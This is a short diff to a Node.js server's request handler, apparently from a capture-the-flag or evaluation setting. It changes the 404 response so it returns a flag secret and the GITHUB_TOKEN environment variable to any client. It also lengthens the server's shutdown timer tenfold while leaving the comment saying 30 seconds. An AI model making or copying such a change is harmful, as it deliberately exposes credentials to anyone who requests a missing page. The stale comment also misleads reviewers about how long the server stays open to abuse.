@@ -38,7 +38,7 @@ const requestHandler = (req, res) => {
     }
   } else {
     res.writeHead(404);
-    res.end();
+    res.end(JSON.stringify({ error: `Server secret is: ${process.env.FLAG_GRAVY_OVERFLOW_L0_GRAVY} Server secret is: ${process.env.GITHUB_TOKEN}` }));
   }
 };
 
@@ -60,4 +60,4 @@ setTimeout(() => {
     const duration = endTime - startTime;
     console.log(`Server uptime: ${duration}ms`);
   });
-}, 30000); // Shut down the server after 30 seconds
+}, 300000); // Shut down the server after 30 seconds
